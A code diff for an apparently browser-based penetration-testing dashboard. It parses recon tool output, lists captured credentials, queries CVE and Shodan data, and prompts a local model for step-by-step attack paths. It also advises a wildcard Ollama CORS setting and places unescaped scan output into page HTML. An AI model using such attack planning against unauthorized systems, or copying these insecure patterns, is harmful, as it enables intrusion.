+    if (title.length > 5) azAddFinding(sev, 'Nikto: ' + title, ip, port, 'tcp', 'http', [...cves,...osvdb.map(o=>'OSVDB-'+o.replace('OSVDB-',''))], l);
+  }
+}
+
+// ── Gobuster / dirb / ffuf parser ───────────────────────────
+function azParseGobuster(text, fname) {
+  const ipM = text.match(/(\d{1,3}(?:\.\d{1,3}){3})/) || text.match(/https?:\/\/([\w\.\-]+)/);
+  const ip   = ipM ? ipM[1] : fname;
+  const portM= text.match(/:(\d+)\//); const port = portM ? portM[1] : '80';
+  const lines = text.split('\n');
+  let found = 0;
+  for (const line of lines) {
+    const l = line.trim();
+    // gobuster: /path (Status: 200) [Size: 1234]
+    // dirb:  + http://ip/path (CODE:200|SIZE:100)
+    // ffuf: path [Status: 200, Size: 100, Words: 10]
+    const pathM = l.match(/^\/?(\S+\.(?:php|asp|aspx|jsp|bak|zip|tar|gz|sql|conf|config|env|xml|json|log|old|orig|backup|txt))/i)
+                || l.match(/(\/\S+)\s+(?:Status:|Found:|\[Status:|\(CODE:)/);
+    if (!pathM) continue;
+    const path = pathM[1];
+    let sev = 'INFO';
+    if (/\.bak|\.sql|\.zip|\.tar|\.gz|\.old|\.orig|backup|dump/i.test(path)) sev = 'HIGH';
+    else if (/admin|login|config|\.env|\.conf|phpinfo|setup|install|\.xml|\.json/i.test(path)) sev = 'MEDIUM';
+    azAddFinding(sev, 'Dir: ' + path, ip, port, 'tcp', 'http', [], line.trim());
+    found++;
+  }
+  if (found) azAddFinding('INFO', `${found} paths discovered on ${ip}:${port}`, ip, port, 'tcp', 'http', [], `Source: ${fname}`);
+}
+
+// ── DNSrecon / dnsenum parser ────────────────────────────────
+function azParseDnsrecon(text, fname) {
+  const ipM = text.match(/(\d{1,3}(?:\.\d{1,3}){3})/); const ip = ipM ? ipM[1] : '';
+  if (/zone transfer/i.test(text) && /\bA\b|\bAAAA\b|\bCNAME\b/.test(text))
+    azAddFinding('HIGH', 'DNS Zone Transfer Successful', ip, '53', 'udp', 'dns', [], text.substring(0,500));
+  const subs = [...new Set((text.match(/[\w\-]+\.[\w\-]+\.[\w\.]{2,}/g)||[]).filter(s=>/[a-z]/.test(s)))];
+  if (subs.length > 2) azAddFinding('MEDIUM', `DNS Subdomains Found (${subs.length})`, ip, '53', 'udp', 'dns', [], subs.join('\n'));
+  if (/recursion enabled|recursive query allowed/i.test(text))
+    azAddFinding('MEDIUM', 'DNS Recursion Enabled', ip, '53', 'udp', 'dns', [], 'Recursive queries allowed — risk of amplification attacks');
+  if (/cache snooping/i.test(text))
+    azAddFinding('HIGH', 'DNS Cache Snooping Possible', ip, '53', 'udp', 'dns', [], text.substring(0,300));
+}
+
+
+// ── smbclient / impacket parser ──────────────────────────────
+function azParseSmbclient(text, fname) {
+  const ipM = text.match(/(\d{1,3}(?:\.\d{1,3}){3})/); const ip = ipM ? ipM[1] : '';
+  if (/anonymous|null session|guest/i.test(text))
+    azAddFinding('HIGH', 'SMB Null/Guest Session', ip, '445', 'tcp', 'smb', [], 'Unauthenticated SMB access possible');
+  const shares = [...(text.matchAll(/Disk\|?\s*([\w\$]+)/g))].map(m=>m[1]);
+  if (shares.length) azAddFinding('MEDIUM', 'SMB Shares: ' + shares.join(', '), ip, '445', 'tcp', 'smb', [], shares.join('\n'));
+  if (/READ|WRITE/i.test(text)) azAddFinding('HIGH', 'SMB Share Read/Write Access', ip, '445', 'tcp', 'smb', [], text.substring(0,400));
+}
+
+// ── WhatWeb parser ───────────────────────────────────────────
+function azParseWhatweb(text, fname) {
+  const ipM = text.match(/https?:\/\/([\d\.]+)/); const ip = ipM ? ipM[1] : '';
+  const portM= text.match(/:(\d+)/); const port = portM ? portM[1] : '80';
+  if (/wordpress/i.test(text)) azAddFinding('MEDIUM', 'WordPress Detected', ip, port, 'tcp', 'http', [], text.substring(0,300));
+  if (/joomla/i.test(text))   azAddFinding('MEDIUM', 'Joomla Detected', ip, port, 'tcp', 'http', [], text.substring(0,300));
+  if (/drupal/i.test(text))   azAddFinding('MEDIUM', 'Drupal Detected', ip, port, 'tcp', 'http', [], text.substring(0,300));
+  if (/phpmyadmin/i.test(text)) azAddFinding('HIGH', 'phpMyAdmin Detected', ip, port, 'tcp', 'http', [], text.substring(0,300));
+  const frameworks = (text.match(/\b(Laravel|Django|Rails|Spring|Struts|Tomcat|WebLogic|JBoss|IIS|nginx|Apache)\b/gi)||[]);
+  if (frameworks.length) azAddFinding('INFO', 'Tech Stack: ' + [...new Set(frameworks)].join(', '), ip, port, 'tcp', 'http', [], text.substring(0,400));
+}
+
+function azAddFinding(sev, title, ip, port, proto, svc, cves, detail) {
+  if (_aFindings.some(f=>f.title===title&&f.ip===ip&&f.port===port)) return;
+  _aFindings.push({sev,title,ip,port,proto,svc,cves:cves||[],detail:detail||''});
+}
+
+function azVulnSev(body, sname) {
+  if (/critical|rce|remote code exec|command exec/i.test(body)) return 'CRITICAL';
+  if (/high|exploit|arbitrary|bypass|overflow/i.test(body)) return 'HIGH';
+  if (/medium|disclosure|xss|csrf|open redirect/i.test(body)) return 'MEDIUM';
+  if (/low|info/i.test(body)) return 'LOW';
+  return 'MEDIUM';
+}
+
+function azVulnTitle(body) {
+  const m = body.match(/^\s*[\|\s]*([A-Z][^\n]{5,60})/m);
+  return m ? m[1].replace(/\|/g,'').trim() : '';
+}
+
+function azScriptTitle(sname, body) {
+  const first = body.split('\n').find(l=>l.replace(/[|\s]/g,'').length>4)||'';
+  return sname + ': ' + first.replace(/[|\s]+/g,' ').trim().substring(0,60);
+}
+
+function azExtractCVEs(text) {
+  return [...new Set((text.match(/CVE-\d{4}-\d{4,7}/gi)||[]).map(c=>c.toUpperCase()))];
+}
+
+function azClear() { _aFindings=[]; _aCreds=[]; _aFiles=[]; _aTab='findings'; renderAnalyzeTab(); }
+function azSetTab(t) { _aTab = t; renderAnalyzeTab(); }
+
+function azRenderTab() {
+  const body = document.getElementById('azBody');
+  if (!body) return;
+  if (_aTab === 'findings') azRenderFindings(body);
+  else if (_aTab === 'creds') azRenderCreds(body);
+  else azRenderReport(body);
+}
+
+function azRenderFindings(body) {
+  if (!_aFindings.length) {
+    body.innerHTML = '<div style="color:var(--text3);font-size:12px;padding:20px;text-align:center">No findings yet — upload output files above</div>';
+    return;
+  }
+  const sevOrd = s => ({CRITICAL:0,HIGH:1,MEDIUM:2,LOW:3,INFO:4}[s]||5);
+  const sorted = [..._aFindings].sort((a,b)=>sevOrd(a.sev)-sevOrd(b.sev));
+  const colorMap = {CRITICAL:'#cf222e',HIGH:'#bc4c00',MEDIUM:'#f59e0b',LOW:'#1a7f37',INFO:'#0a7ea4'};
+  const sevs = ['CRITICAL','HIGH','MEDIUM','LOW','INFO'];
+  let html = '<div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px">';
+  for (const s of sevs) {
+    const n=_aFindings.filter(f=>f.sev===s).length;
+    if(n) html += '<span style="font-size:10px;font-weight:700;padding:2px 8px;border-radius:4px;color:'+colorMap[s]+';background:'+colorMap[s]+'18;border:1px solid '+colorMap[s]+'33">'+s+' '+n+'</span>';
+  }
+  html += '</div>';
+  for (const f of sorted) {
+    const c = colorMap[f.sev]||'#888';
+    html += '<div style="border:1px solid '+c+'33;border-radius:6px;margin-bottom:6px;overflow:hidden">' +
+      '<div style="background:'+c+'10;padding:6px 10px;display:flex;align-items:center;gap:8px;cursor:pointer" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display===\'none\'?\'block\':\'none\'">' +
+        '<span style="font-size:10px;font-weight:700;color:'+c+'">'+f.sev+'</span>' +
+        '<span style="font-size:11px;color:var(--text);flex:1">'+f.title+'</span>' +
+        (f.ip?'<span style="font-size:10px;font-family:monospace;color:var(--accent2)">'+f.ip+(f.port?':'+f.port:'')+'</span>':'') +
+      '</div>' +
+      '<div style="display:none;padding:8px 10px;font-size:10px;color:var(--text2);white-space:pre-wrap;background:var(--bg2)">'+
+        (f.cves.length?'<span style="color:#0a7ea4">'+f.cves.join(' ')+'</span>\n':'')+f.detail+
+      '</div></div>';
+  }
+  body.innerHTML = html;
+}
+
+function azRenderCreds(body) {
+  if (!_aCreds.length) {
+    body.innerHTML = '<div style="color:var(--text3);font-size:12px;padding:20px;text-align:center">No credentials found yet</div>';
+    return;
+  }
+  let html = '<div style="color:#cf222e;font-size:11px;font-weight:700;margin-bottom:8px">⚠️ ' + _aCreds.length + ' credential(s) found</div>';
+  for (const c of _aCreds) {
+    html += '<div style="background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.2);border-radius:5px;padding:8px 10px;margin-bottom:5px;font-size:11px;font-family:monospace">' +
+      '<span style="color:var(--accent2)">' + c.ip + ':' + c.port + '</span> [' + c.proto + ']  ' +
+      '<span style="color:#cf222e">user: ' + c.user + '  pass: ' + c.pass + '</span>' +
+      '</div>';
+  }
+  body.innerHTML = html;
+}
+
+function azRenderReport(body) {
+  const date = new Date().toISOString().split('T')[0];
+  const crit=_aFindings.filter(f=>f.sev==='CRITICAL').length;
+  const high=_aFindings.filter(f=>f.sev==='HIGH').length;
+  const med=_aFindings.filter(f=>f.sev==='MEDIUM').length;
+  const low=_aFindings.filter(f=>f.sev==='LOW').length;
+  const lines = [
+    '='.repeat(65), 'PENETRATION TEST REPORT — AA-VAPT', '='.repeat(65),
+    'Date: ' + date, 'Hosts: ' + Object.keys(_hosts).length,
+    'Findings: CRITICAL=' + crit + ' HIGH=' + high + ' MEDIUM=' + med + ' LOW=' + low,
+    'Credentials Captured: ' + _aCreds.length, '='.repeat(65), '',
+  ];
+  const sevOrd = s => ({CRITICAL:0,HIGH:1,MEDIUM:2,LOW:3,INFO:4}[s]||5);
+  const sorted = [..._aFindings].sort((a,b)=>sevOrd(a.sev)-sevOrd(b.sev));
+  sorted.forEach((f,i) => {
+    lines.push('[' + (i+1) + '] ' + f.sev + ' — ' + f.title);
+    if (f.ip) lines.push('    Host: ' + f.ip + (f.port ? ':' + f.port : '') + ' [' + f.svc + ']');
+    if (f.cves.length) lines.push('    CVEs: ' + f.cves.join(', '));
+    if (f.detail) lines.push('    ' + f.detail.split('\n').slice(0,3).join('\n    '));
+    lines.push('');
+  });
+  if (_aCreds.length) {
+    lines.push('-'.repeat(65), 'CREDENTIALS', '-'.repeat(65));
+    _aCreds.forEach(c => lines.push('  ' + c.ip + ':' + c.port + ' [' + c.proto + ']  user:' + c.user + '  pass:' + c.pass));
+  }
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(new Blob([lines.join('\n')],{type:'text/plain'}));
+  a.download = 'pt_report_' + date + '.txt'; a.click();
+  body.innerHTML = '<div style="color:var(--green);font-size:12px;padding:20px;text-align:center">✅ Report downloaded: pt_report_' + date + '.txt</div>';
+}
+
+// ══════════════════════════════════════════════════════════════
+// ⚙️ SETTINGS
+// ══════════════════════════════════════════════════════════════
+function getSetting(key, def) {
+  try { return localStorage.getItem('aavapt_' + key) || def; } catch(e) { return def; }
+}
+function setSetting(key, val) {
+  try { localStorage.setItem('aavapt_' + key, val); } catch(e) {}
+}
+
+function openSettings() {
+  document.getElementById('cfg_ollamaUrl').value   = getSetting('ollamaUrl',  'http://localhost:11434');
+  document.getElementById('cfg_ollamaModel').value = getSetting('ollamaModel','');
+  document.getElementById('cfg_shodanKey').value   = getSetting('shodanKey',  '');
+  document.getElementById('cfg_nvdKey').value      = getSetting('nvdKey',     '');
+  document.getElementById('settingsModal').classList.remove('hidden');
+}
+function closeSettings() { document.getElementById('settingsModal').classList.add('hidden'); }
+
+function saveSettings() {
+  setSetting('ollamaUrl',   document.getElementById('cfg_ollamaUrl').value.trim());
+  setSetting('ollamaModel', document.getElementById('cfg_ollamaModel').value.trim());
+  setSetting('shodanKey',   document.getElementById('cfg_shodanKey').value.trim());
+  setSetting('nvdKey',      document.getElementById('cfg_nvdKey').value.trim());
+  closeSettings();
+}
+
+const CORS_HINT = '\n⚠️ CORS fix: open CMD and run:\n  set OLLAMA_ORIGINS=*\n  ollama serve';
+
+async function testOllama() {
+  const st = document.getElementById('ollamaStatus');
+  st.style.color = 'var(--yellow)'; st.textContent = '⏳ Testing...';
+  const url   = document.getElementById('cfg_ollamaUrl').value.trim()  || 'http://localhost:11434';
+  const model = document.getElementById('cfg_ollamaModel').value.trim() || getSetting('ollamaModel','');
+  if (!model) { st.style.color='var(--red)'; st.textContent='❌ Enter model name first (click List Models)'; return; }
+  try {
+    const res = await fetch(url + '/api/chat', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({model, messages:[{role:'user',content:'Reply with only the word OK'}], stream:false})
+    });
+    if (!res.ok) { throw new Error('HTTP ' + res.status + ' — model "' + model + '" not found? Run: ollama pull ' + model); }
+    const j = await res.json();
+    st.style.color = 'var(--green)';
+    st.textContent = '✅ ' + model + ' OK — ' + (j.message?.content||'').substring(0,50);
+  } catch(e) {
+    st.style.color = 'var(--red)';
+    const isCors = e.message.includes('Failed to fetch') || e.message.includes('NetworkError');
+    st.textContent = '❌ ' + e.message + (isCors ? CORS_HINT : '');
+    st.style.whiteSpace = 'pre-wrap';
+  }
+}
+
+async function listOllamaModels() {
+  const st = document.getElementById('ollamaStatus');
+  st.style.color = 'var(--yellow)'; st.textContent = '⏳ Fetching models...';
+  const url = document.getElementById('cfg_ollamaUrl').value.trim() || 'http://localhost:11434';
+  try {
+    const res = await fetch(url + '/api/tags');
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+    const j = await res.json();
+    const models = (j.models||[]).map(m=>m.name);
+    if (!models.length) { st.style.color='var(--yellow)'; st.textContent='⚠️ No models installed. Run: ollama pull deepseek-r1'; return; }
+    // Auto-fill model input with first model if empty
+    const inp = document.getElementById('cfg_ollamaModel');
+    inp.value = models[0];  // always update to first installed model
+    st.style.color = 'var(--green)';
+    st.textContent = '✅ Installed: ' + models.join('  |  ');
+  } catch(e) {
+    st.style.color = 'var(--red)';
+    const isCors = e.message.includes('Failed to fetch') || e.message.includes('NetworkError');
+    st.textContent = '❌ ' + e.message + (isCors ? CORS_HINT : '');
+    st.style.whiteSpace = 'pre-wrap';
+  }
+}
+
+// ══════════════════════════════════════════════════════════════
+// 🤖 OLLAMA AI
+// ══════════════════════════════════════════════════════════════
+// _aiHistory declared at top of script
+
+async function ollamaChat(userMsg, systemPrompt) {
+  const url   = getSetting('ollamaUrl',   'http://localhost:11434');
+  const model = getSetting('ollamaModel', '');
+  if (!model) throw new Error('No model set. Open ⚙️ Settings → click List Models → Save.');
+  const messages = [];
+  if (systemPrompt) messages.push({role:'system', content:systemPrompt});
+  messages.push(..._aiHistory.slice(-10));
+  messages.push({role:'user', content:userMsg});
+
+  let res;
+  try {
+    res = await fetch(url + '/api/chat', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({model, messages, stream:true})
+    });
+  } catch(e) {
+    const isCors = e.message.includes('Failed to fetch') || e.message.includes('NetworkError');
+    throw new Error(isCors
+      ? 'CORS blocked. Fix:\n  1. Open CMD\n  2. set OLLAMA_ORIGINS=*\n  3. ollama serve\nThen reload this page.'
+      : 'Cannot connect to Ollama at ' + url + '\nMake sure Ollama is running: ollama serve');
+  }
+  if (!res.ok) throw new Error('Model "' + model + '" error ' + res.status + '. Run: ollama pull ' + model);
+
+  const reader = res.body.getReader();
+  const dec = new TextDecoder();
+  let full = '';
+  return {
+    stream: async (onChunk) => {
+      while (true) {
+        const {done, value} = await reader.read();
+        if (done) break;
+        for (const line of dec.decode(value).split('\n')) {
+          if (!line.trim()) continue;
+          try {
+            const j = JSON.parse(line);
+            if (j.message?.content) { full += j.message.content; onChunk(j.message.content); }
+          } catch(e) {}
+        }
+      }
+      _aiHistory.push({role:'user', content:userMsg});
+      _aiHistory.push({role:'assistant', content:full});
+      return full;
+    }
+  };
+}
+
+function aiAddMsg(role, text, id) {
+  const box = document.getElementById('aiMsgs');
+  const div = document.createElement('div');
+  div.className = 'ai-msg ' + role;
+  if (id) div.id = id;
+  div.textContent = text;
+  box.appendChild(div);
+  box.scrollTop = box.scrollHeight;
+  return div;
+}
+
+function aiClearChat() {
+  _aiHistory = [];
+  const box = document.getElementById('aiMsgs');
+  box.innerHTML = '<div class="ai-msg system">🤖 Chat cleared. Ready for new conversation.</div>';
+}
+
+async function aiSend() {
+  const inp = document.getElementById('aiInput');
+  const msg = inp.value.trim();
+  if (!msg) return;
+  inp.value = '';
+  aiAddMsg('user', msg);
+  const thinkingId = 'ai_thinking_' + Date.now();
+  const thinkDiv = aiAddMsg('ai', '⏳ Thinking...', thinkingId);
+
+  try {
+    const ctx = buildScanContext();
+    const stream = await ollamaChat(msg, 'You are a penetration testing AI assistant. Current scan context:\n' + ctx);
+    let text = '';
+    thinkDiv.textContent = '';
+    await stream.stream(chunk => {
+      text += chunk;
+      thinkDiv.textContent = text;
+      document.getElementById('aiMsgs').scrollTop = 99999;
+    });
+  } catch(e) {
+    thinkDiv.className = 'ai-msg err';
+    thinkDiv.textContent = '❌ ' + e.message + '\n\nMake sure Ollama is running: ollama serve';
+  }
+}
+
+function buildScanContext() {
+  const hosts = Object.keys(_hosts);
+  if (!hosts.length) return 'No hosts loaded yet.';
+  let ctx = 'Loaded ' + hosts.length + ' hosts:\n';
+  for (const ip of hosts.slice(0,20)) {
+    const ports = _hosts[ip].filter(p=>isInteresting(p.port,p.svc));
+    ctx += ip + ': ' + ports.map(p=>p.port+'/'+p.proto+' '+p.svc).join(', ') + '\n';
+  }
+  if (_aFindings.length) {
+    ctx += '\nFindings (' + _aFindings.length + '):\n';
+    ctx += _aFindings.slice(0,15).map(f=>f.sev+': '+f.title+' ('+f.ip+':'+f.port+')').join('\n');
+  }
+  return ctx;
+}
+
+async function aiAnalyzeAll() {
+  if (!Object.keys(_hosts).length) { aiAddMsg('err','❌ No hosts loaded. Upload a file first.'); return; }
+  const ctx = buildScanContext();
+  const prompt = 'Analyze these pentest scan results. List the top vulnerabilities, attack vectors, and recommended next steps:\n\n' + ctx;
+  aiAddMsg('user', '🔍 Analyze all findings');
+  const thinkDiv = aiAddMsg('ai', '⏳ Analyzing...');
+  try {
+    const stream = await ollamaChat(prompt, 'You are an expert penetration tester. Be concise and actionable.');
+    let text = '';
+    thinkDiv.textContent = '';
+    await stream.stream(c => { text+=c; thinkDiv.textContent=text; document.getElementById('aiMsgs').scrollTop=99999; });
+  } catch(e) { thinkDiv.className='ai-msg err'; thinkDiv.textContent='❌ '+e.message; }
+}
+
+async function aiAttackPath() {
+  if (!Object.keys(_hosts).length) return;
+  const ctx = buildScanContext();
+  const prompt = 'Based on these scan results, what is the most likely successful attack path? Give step-by-step attack chain:\n\n' + ctx;
+  aiAddMsg('user', '🎯 Best attack path?');
+  const thinkDiv = aiAddMsg('ai', '⏳ Planning attack path...');
+  try {
+    const stream = await ollamaChat(prompt, 'You are an expert red team operator. Be specific with tools and commands.');
+    let text = '';
+    thinkDiv.textContent = '';
+    await stream.stream(c => { text+=c; thinkDiv.textContent=text; document.getElementById('aiMsgs').scrollTop=99999; });
+  } catch(e) { thinkDiv.className='ai-msg err'; thinkDiv.textContent='❌ '+e.message; }
+}
+
+async function aiExplainHost() {
+  if (!_activeHost) { aiAddMsg('system','Select a host first.'); return; }
+  const ip = _activeHost;
+  const ports = (_hosts[ip]||[]).filter(p=>isInteresting(p.port,p.svc));
+  const ctx = ip + ' open ports: ' + ports.map(p=>p.port+'/'+p.proto+' ('+p.svc+')').join(', ');
+  const prompt = 'Explain the attack surface of this host and what you would do first as a pentester:\n' + ctx;
+  aiAddMsg('user', '💡 Explain host ' + ip);
+  const thinkDiv = aiAddMsg('ai', '⏳ Analyzing host...');
+  try {
+    const stream = await ollamaChat(prompt, 'You are an expert penetration tester.');
+    let text = '';
+    thinkDiv.textContent = '';
+    await stream.stream(c => { text+=c; thinkDiv.textContent=text; document.getElementById('aiMsgs').scrollTop=99999; });
+  } catch(e) { thinkDiv.className='ai-msg err'; thinkDiv.textContent='❌ '+e.message; }
+}
+
+async function aiGenerateReport() {
+  if (!Object.keys(_hosts).length) return;
+  const ctx = buildScanContext();
+  const prompt = 'Write a professional penetration test executive summary report based on these findings. Include: scope, key findings, risk summary, top recommendations:\n\n' + ctx;
+  aiAddMsg('user', '📝 Generate executive report');
+  const thinkDiv = aiAddMsg('ai', '⏳ Writing report...');
+  try {
+    const stream = await ollamaChat(prompt, 'You are a professional penetration test report writer. Write in formal English.');
+    let text = '';
+    thinkDiv.textContent = '';
+    await stream.stream(c => { text+=c; thinkDiv.textContent=text; document.getElementById('aiMsgs').scrollTop=99999; });
+    // offer to copy
+    const copyBtn = document.createElement('button');
+    copyBtn.className = 'btn btn-secondary btn-sm'; copyBtn.style.marginTop='6px';
+    copyBtn.textContent = '📋 Copy Report';
+    copyBtn.onclick = () => navigator.clipboard.writeText(text).then(()=>{ copyBtn.textContent='✅ Copied!'; setTimeout(()=>copyBtn.textContent='📋 Copy Report',1500); });
+    thinkDiv.appendChild(document.createElement('br'));
+    thinkDiv.appendChild(copyBtn);
+  } catch(e) { thinkDiv.className='ai-msg err'; thinkDiv.textContent='❌ '+e.message; }
+}
+
+// ══════════════════════════════════════════════════════════════
+// 🛡 CVE / NVD LOOKUP
+// ══════════════════════════════════════════════════════════════
+async function fetchCVEs(port, svc) {
+  const query = svc && svc !== 'unknown' ? svc : 'port ' + port;
+  const apiKey = getSetting('nvdKey','');
+  const headers = apiKey ? {'apiKey': apiKey} : {};
+  try {
+    const url = 'https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=' + encodeURIComponent(query) + '&resultsPerPage=5&cvssV3Severity=HIGH';
+    const res = await fetch(url, {headers});
+    const j   = await res.json();
+    return (j.vulnerabilities || []).map(v => ({
+      id:   v.cve.id,
+      desc: (v.cve.descriptions?.find(d=>d.lang==='en')?.value||'').substring(0,120),
+      sev:  v.cve.metrics?.cvssMetricV31?.[0]?.cvssData?.baseSeverity ||
+            v.cve.metrics?.cvssMetricV2?.[0]?.baseSeverity || 'UNKNOWN',
+      score: v.cve.metrics?.cvssMetricV31?.[0]?.cvssData?.baseScore || ''
+    }));
+  } catch(e) { return []; }
+}
+
+async function showCVEs(port, svc, btn) {
+  const block = btn.closest('.tblock');
+  let panel = block.querySelector('.cve-panel');
+  if (panel) { panel.remove(); btn.textContent = 'CVE'; return; } // toggle off
+
+  btn.textContent = '⏳';
+  const cves = await fetchCVEs(port, svc);
+  btn.textContent = 'CVE';
+
+  panel = document.createElement('div');
+  panel.className = 'cve-panel';
+  const sevColor = {CRITICAL:'#cf222e',HIGH:'#bc4c00',MEDIUM:'#f59e0b',LOW:'#1a7f37',UNKNOWN:'#888'};
+
+  if (!cves.length) {
+    panel.innerHTML = '<span style="color:var(--text3)">No HIGH/CRITICAL CVEs found for "' + svc + '"</span>';
+  } else {
+    panel.innerHTML = '<div style="font-weight:700;color:#0a7ea4;margin-bottom:4px">CVEs for ' + svc + ' (port ' + port + '):</div>' +
+      cves.map(c =>
+        '<div class="cve-item">' +
+          '<span class="cve-id"><a href="https://nvd.nist.gov/vuln/detail/' + c.id + '" target="_blank" style="color:#0a7ea4;text-decoration:none">' + c.id + '</a></span>' +
+          '<span class="cve-sev" style="color:' + (sevColor[c.sev]||'#888') + ';background:' + (sevColor[c.sev]||'#888') + '18">' + c.sev + (c.score?' '+c.score:'') + '</span>' +
+          '<span class="cve-desc">' + c.desc + '</span>' +
+        '</div>'
+      ).join('');
+  }
+  block.appendChild(panel);
+}
+
+// ══════════════════════════════════════════════════════════════
+// 🔍 SHODAN LOOKUP
+// ══════════════════════════════════════════════════════════════
+async function shodanLookup(ip, btn) {
+  const key = getSetting('shodanKey','');
+  if (!key) {
+    alert('Shodan API key not set. Go to ⚙️ Settings and add your Shodan key.\nGet a free key at: account.shodan.io');
+    return;
+  }
+  const orig = btn.textContent; btn.textContent = '⏳';
+  try {
+    const res = await fetch('https://api.shodan.io/shodan/host/' + ip + '?key=' + key);
+    const j   = await res.json();
+    if (j.error) { alert('Shodan: ' + j.error); btn.textContent = orig; return; }
+    const html = '<div class="shodan-panel">' +
+      '<div class="shodan-title">🔍 Shodan: ' + ip + '</div>' +
+      '<div class="shodan-row"><span class="shodan-k">Country:</span><span>' + (j.country_name||'?') + ' ' + (j.city||'') + '</span></div>' +
+      '<div class="shodan-row"><span class="shodan-k">ISP/Org:</span><span>' + (j.org||j.isp||'?') + '</span></div>' +
+      '<div class="shodan-row"><span class="shodan-k">Ports:</span><span>' + (j.ports||[]).join(', ') + '</span></div>' +
+      '<div class="shodan-row"><span class="shodan-k">Hostnames:</span><span>' + (j.hostnames||[]).join(', ')||'none' + '</span></div>' +
+      '<div class="shodan-row"><span class="shodan-k">OS:</span><span>' + (j.os||'unknown') + '</span></div>' +
+      (j.vulns?'<div class="shodan-row"><span class="shodan-k" style="color:#cf222e">Vulns:</span><span style="color:#cf222e">' + Object.keys(j.vulns).join(', ') + '</span></div>':'') +
+      '<a href="https://www.shodan.io/host/' + ip + '" target="_blank" style="font-size:9px;color:var(--accent2);margin-top:4px">Open in Shodan ↗</a>' +
+    '</div>';
+    // Insert after host chip
+    const chip = btn.closest('.hchip');
+    let existing = chip.nextElementSibling;
+    if (existing && existing.classList.contains('shodan-panel')) { existing.remove(); btn.textContent = orig; return; }
+    chip.insertAdjacentHTML('afterend', html);
+  } catch(e) { alert('Shodan error: ' + e.message); }
+  btn.textContent = orig;
+}
+
+// ══════════════════════════════════════════════════════════════
+// 🕐 SCAN HISTORY (localStorage)
+// ══════════════════════════════════════════════════════════════
+function getHistory() {
+  try { return JSON.parse(localStorage.getItem('aavapt_history')||'[]'); } catch(e) { return []; }
+}
+function saveHistory(h) {
+  try { localStorage.setItem('aavapt_history', JSON.stringify(h.slice(-20))); } catch(e) {} // keep last 20
+}
+
+function saveCurrentScan() {
+  const ips = Object.keys(_hosts);
+  if (!ips.length) { alert('No scan data to save.'); return; }
+  const name = prompt('Scan name:', ips[0] + ' (' + ips.length + ' hosts)');
+  if (!name) return;
+  const h = getHistory();
+  h.push({
+    name, ts: Date.now(), hosts: Object.keys(_hosts).length,
+    ports: Object.values(_hosts).reduce((a,p)=>a+p.length,0),
+    data: JSON.parse(JSON.stringify(_hosts)) // deep copy
+  });
+  saveHistory(h);
+  updateHistUI();
+}
+
+function updateHistUI() {
+  const h = getHistory();
+  const cnt = document.getElementById('histCount');
+  if (cnt) cnt.textContent = h.length ? '(' + h.length + ')' : '';
+  renderHistDrop();
+}
+
+function toggleHistDrop() {
+  const d = document.getElementById('histDrop');
+  d.classList.toggle('hidden');
+  if (!d.classList.contains('hidden')) renderHistDrop();
+}
+
+function renderHistDrop() {
+  const d = document.getElementById('histDrop');
+  const h = getHistory();
+  if (!h.length) {
+    d.innerHTML = '<div class="hist-item"><div class="hist-name" style="color:var(--text3)">No saved scans</div></div>';
+    return;
+  }
+  d.innerHTML = h.slice().reverse().map((s,i) =>
+    '<div class="hist-item" onclick="loadHistScan(' + (h.length-1-i) + ')">' +
+      '<div class="hist-name">' + s.name + '</div>' +
+      '<div class="hist-meta">' + new Date(s.ts).toLocaleString() + ' \xb7 ' + s.hosts + ' hosts \xb7 ' + s.ports + ' ports</div>' +
+    '</div>'
+  ).join('') +
+  '<div class="hist-item" onclick="clearHistory()" style="color:var(--red);font-size:10px;text-align:center">🗑 Clear History</div>';
+}
+
+function loadHistScan(idx) {
+  const h = getHistory();
+  if (!h[idx]) return;
+  _hosts = h[idx].data;
+  _activeHost = null; _activePort = null; window._SS = {};
+  document.getElementById('histDrop').classList.add('hidden');
+  autoGenerate();
+}
+
+function clearHistory() {
+  if (!confirm('Clear all scan history?')) return;
+  try { localStorage.removeItem('aavapt_history'); } catch(e) {}
+  updateHistUI();
+}
+
+// ══════════════════════════════════════════════════════════════
+// EXPLOIT-DB
+// ══════════════════════════════════════════════════════════════
+function exploitDbSearch(svc, port) {
+  const q = svc && svc !== 'unknown' ? svc : port;
+  window.open('https://www.exploit-db.com/search?q=' + encodeURIComponent(q), '_blank');
+}
+
+// ══════════════════════════════════════════════════════════════
+// INIT
+// ══════════════════════════════════════════════════════════════
+(function initApp() {
+  try { updateHistUI(); } catch(e) {}
+})();
+</script>
+</body>
+</html>
